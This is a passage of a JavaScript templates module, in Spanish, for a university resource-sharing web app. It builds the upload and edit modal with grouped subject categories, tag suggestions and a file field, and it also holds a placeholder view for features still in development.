                group: "🖥️ Tecnología y Computación",
                options: [
                    "Programación",
                    "Base de Datos",
                    "Inteligencia Artificial",
                    "Desarrollo Web",
                    "Redes y Seguridad",
                    "Sistemas Operativos",
                    "Ingeniería de Software",
                    "Machine Learning"
                ]
            },
            {
                group: "🔬 Ciencias Básicas",
                options: [
                    "Matemáticas",
                    "Física",
                    "Química",
                    "Cálculo",
                    "Estadística",
                    "Álgebra",
                    "Geometría"
                ]
            },
            {
                group: "🎨 Diseño y Creatividad",
                options: [
                    "Diseño Gráfico",
                    "Diseño UX/UI",
                    "Animación Digital",
                    "Fotografía",
                    "Arquitectura",
                    "Dibujo Técnico"
                ]
            },
            {
                group: "📊 Negocios y Administración",
                options: [
                    "Administración",
                    "Contabilidad",
                    "Marketing",
                    "Economía",
                    "Finanzas",
                    "Emprendimiento"
                ]
            },
            {
                group: "⚖️ Derecho y Ciencias Sociales",
                options: [
                    "Derecho Civil",
                    "Derecho Penal",
                    "Psicología",
                    "Sociología",
                    "Comunicación",
                    "Periodismo"
                ]
            },
            {
                group: "🏥 Ciencias de la Salud",
                options: [
                    "Medicina",
                    "Enfermería",
                    "Nutrición",
                    "Farmacología",
                    "Anatomía",
                    "Fisiología"
                ]
            },
            {
                group: "🌐 Idiomas y Humanidades",
                options: [
                    "Inglés",
                    "Español",
                    "Literatura",
                    "Historia",
                    "Filosofía",
                    "Lingüística"
                ]
            },
            {
                group: "🔧 Ingenierías",
                options: [
                    "Ingeniería Civil",
                    "Ingeniería Industrial",
                    "Ingeniería Eléctrica",
                    "Ingeniería Mecánica",
                    "Ingeniería Química"
                ]
            }
        ];

        return /*html*/`
        <div class="bg-white rounded-2xl shadow-2xl w-full max-w-2xl overflow-hidden transform animate-modal-in max-h-[90vh] overflow-y-auto">
            <form id="resource-form" data-id="${isEdit ? resource.id : ''}" data-private="${isPrivate}">
                <!-- Encabezado del Modal -->
                <div class="flex justify-between items-center p-6 bg-gradient-to-r from-blue-50 to-gray-50 border-b border-gray-200 sticky top-0 bg-white z-10">
                    <h3 class="text-xl font-bold text-gray-900">${title}</h3>
                    <button type="button" id="close-modal-btn" class="text-gray-400 hover:text-gray-600 transform hover:scale-110 transition-all duration-200">
                        <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12" />
                        </svg>
                    </button>
                </div>
                
                <!-- Cuerpo del Modal -->
                <div class="p-6 space-y-6">
                    ${!isPrivate ? /*html*/`
                    <!-- Título -->
                    <div class="transform transition-all duration-300 hover:scale-[1.01]">
                        <label for="res-title" class="block text-sm font-semibold text-gray-700 mb-2">
                            Título del Recurso *
                        </label>
                        <input type="text" 
                               id="res-title" 
                               class="${inputClasses}" 
                               value="${esc(isEdit ? resource.title : '')}" 
                               placeholder="Ej: Guía completa de Python para principiantes"
                               required>
                        <p class="text-xs text-gray-500 mt-1">Describe claramente el contenido de tu recurso</p>
                    </div>

                    <!-- Autor -->
                    <div class="transform transition-all duration-300 hover:scale-[1.01]">
                        <label for="res-author" class="block text-sm font-semibold text-gray-700 mb-2">
                            Autor(es) *
                            <span class="text-xs font-normal text-gray-500 ml-1">(Puedes modificar este campo)</span>
                        </label>
                        <input type="text" 
                               id="res-author" 
                               class="${inputClasses}" 
                               value="${esc(defaultAuthor)}" 
                               placeholder="Ej: Juan Pérez, María García"
                               required>
                        <p class="text-xs text-gray-500 mt-1">Separa múltiples autores con comas</p>
                    </div>

                    <!-- Categoría -->
                    <div class="transform transition-all duration-300 hover:scale-[1.01]">
                        <label for="res-category" class="block text-sm font-semibold text-gray-700 mb-2">
                            Categoría Principal *
                        </label>
                        <select id="res-category" class="${selectClasses}" required>
                            <option value="">Selecciona una categoría...</option>
                            ${categories.map(group => `
                                <optgroup label="${group.group}">
                                    ${group.options.map(option => `
                                        <option value="${option}" ${isEdit && resource.category === option ? 'selected' : ''}>
                                            ${option}
                                        </option>
                                    `).join('')}
                                </optgroup>
                            `).join('')}
                        </select>
                        <p class="text-xs text-gray-500 mt-1">Elige la categoría que mejor describe tu recurso</p>
                    </div>

                    <!-- Etiquetas -->
                    <div class="transform transition-all duration-300 hover:scale-[1.01]">
                        <label for="res-tags" class="block text-sm font-semibold text-gray-700 mb-2">
                            Etiquetas 
                            <span class="text-xs font-normal text-gray-500 ml-1">(Opcional)</span>
                        </label>
                        <div class="relative">
                            <input type="text" 
                                   id="res-tags" 
                                   class="${inputClasses} pr-20" 
                                   value="${esc(isEdit ? resource.tags : '')}" 
                                   placeholder="Ej: python, programación, ejercicios, tutorial">
                            <div class="absolute right-3 top-1/2 transform -translate-y-1/2">
                                <span class="text-xs text-gray-400 bg-gray-100 px-2 py-1 rounded">⌨️</span>
                            </div>
                        </div>
                        <div class="mt-2">
                            <p class="text-xs text-gray-600 mb-2">
                                <strong>Sugerencias de etiquetas populares:</strong>
                            </p>
                            <div class="flex flex-wrap gap-1">
                                ${['python', 'java', 'html', 'css', 'javascript', 'sql', 'algoritmos', 'tutorial', 'ejercicios', 'proyecto', 'examen', 'guia'].map(tag => `
                                    <button type="button" 
                                            class="tag-suggestion text-xs bg-blue-100 text-blue-700 px-2 py-1 rounded-full hover:bg-blue-200 transition-colors duration-200"
                                            data-tag="${tag}">
                                        ${tag}
                                    </button>
                                `).join('')}
                            </div>
                        </div>
                    </div>
                    ` : /*html*/`
                    <!-- Título para archivo privado -->
                    <div class="transform transition-all duration-300 hover:scale-[1.01]">
                        <label for="res-title" class="block text-sm font-semibold text-gray-700 mb-2">
                            Título del Archivo *
                        </label>
                        <input type="text" 
                               id="res-title" 
                               class="${inputClasses}" 
                               value="${esc(isEdit ? resource.title : '')}" 
                               placeholder="Ej: Mis apuntes de matemáticas"
                               required>
                        <p class="text-xs text-gray-500 mt-1">Asigna un nombre descriptivo a tu archivo</p>
                    </div>
                    `}

                    <!-- Archivo -->
                    <div class="transform transition-all duration-300 hover:scale-[1.01]">
                        <label for="res-file" class="block text-sm font-semibold text-gray-700 mb-2">
                            Archivo ${!isEdit ? '*' : ''}
                        </label>
                        <div class="border-2 border-dashed border-gray-300 rounded-xl p-6 text-center transition-all duration-300 hover:border-blue-400 hover:bg-blue-50">
                            <div class="flex flex-col items-center justify-center">
                                <svg class="w-12 h-12 text-gray-400 mb-3" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M7 16a4 4 0 01-.88-7.903A5 5 0 1115.9 6L16 6a5 5 0 011 9.9M15 13l-3-3m0 0l-3 3m3-3v12"></path>
                                </svg>
                                <p class="text-sm text-gray-600 mb-2">
                                    <span class="font-semibold">Haz clic para subir</span> o arrastra y suelta
                                </p>
                                <p class="text-xs text-gray-500 mb-4">
                                    Formatos soportados: PDF, DOC, DOCX, PPT, PPTX, XLS, XLSX, ZIP, TXT
                                </p>
                                <input type="file" 
                                       id="res-file" 
                                       class="w-full text-sm text-gray-500
                                              file:mr-4 file:py-2 file:px-4
                                              file:rounded-lg file:border-0
                                              file:text-sm file:font-semibold
                                              file:bg-blue-50 file:text-blue-700
                                              hover:file:bg-blue-100 transition-all duration-300" 
                                       ${isEdit ? '' : 'required'}>
                            </div>
                        </div>
                        ${isEdit ? `
                        <div class="mt-3 p-3 bg-yellow-50 border border-yellow-200 rounded-lg">
                            <p class="text-xs text-yellow-700 flex items-center gap-2">
                                <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-2.5L13.732 4c-.77-.833-1.964-.833-2.732 0L4.082 16.5c-.77.833.192 2.5 1.732 2.5z"></path>
                                </svg>
                                <strong>Archivo actual:</strong> ${esc(resource.original_filename || resource.filename)}
                            </p>
                            <p class="text-xs text-yellow-600 mt-1">
                                Si subes un nuevo archivo, reemplazará el actual.
                            </p>
                        </div>
                        ` : ''}
                    </div>
                </div>
                
                <!-- Pie del Modal -->
                <div class="flex justify-between items-center p-6 bg-gray-50 border-t border-gray-200 sticky bottom-0 bg-white">
                    <div class="text-xs text-gray-500">
                        ${isPrivate ? '🔒 Este archivo será privado y solo tú podrás verlo' : '📚 Comparte conocimiento con la comunidad UFG'}
                    </div>
                    <div class="flex space-x-3">
                        <button type="button" id="cancel-modal-btn" class="bg-white py-3 px-6 rounded-lg border-2 border-gray-300 text-sm font-semibold text-gray-700 hover:bg-gray-50 hover:border-gray-400 transform hover:scale-105 transition-all duration-300">
                            Cancelar
                        </button>
                        <button type="submit" class="bg-gradient-to-r from-blue-500 to-blue-600 text-white py-3 px-6 rounded-lg text-sm font-semibold shadow-lg hover:from-blue-600 hover:to-blue-700 transform hover:scale-105 hover:shadow-xl transition-all duration-300">
                            ${isEdit ? '💾 Actualizar' : '📤 ' + (isPrivate ? 'Subir Archivo' : 'Publicar Recurso')}
                        </button>
                    </div>
                </div>
            </form>
        </div>
        `;
    },

    /**
     * Agrega event listeners para las sugerencias de etiquetas
     */
    addTagSuggestionsListeners() {
        const tagSuggestions = document.querySelectorAll('.tag-suggestion');
        const tagsInput = document.getElementById('res-tags');
        
        if (!tagsInput) return;
        
        tagSuggestions.forEach(button => {
            button.addEventListener('click', () => {
                const tag = button.getAttribute('data-tag');
                const currentTags = tagsInput.value.trim();
                
                if (currentTags === '') {
                    tagsInput.value = tag;
                } else {
                    const tagsArray = currentTags.split(',').map(t => t.trim());
                    if (!tagsArray.includes(tag)) {
                        tagsInput.value = currentTags + ', ' + tag;
                    }
                }
                
                button.style.backgroundColor = '#10B981';
                button.style.color = 'white';
                setTimeout(() => {
                    button.style.backgroundColor = '';
                    button.style.color = '';
                }, 500);
            });
        });
    },

    /**
     * Contenido de placeholder para vistas no implementadas
     */
    placeholderContent(message = 'Vista en desarrollo') {
        return /*html*/`
        <div class="max-w-4xl mx-auto text-center py-16">
            <div class="w-32 h-32 bg-gradient-to-r from-blue-500 to-purple-600 rounded-full flex items-center justify-center mx-auto mb-6">
                <svg class="w-16 h-16 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"></path>
                </svg>
            </div>
            <h2 class="text-3xl font-bold text-gray-800 mb-4">${message}</h2>
            <p class="text-gray-600 text-lg">Esta funcionalidad estará disponible próximamente.</p>
        </div>
        `;
    }
};

export { templates };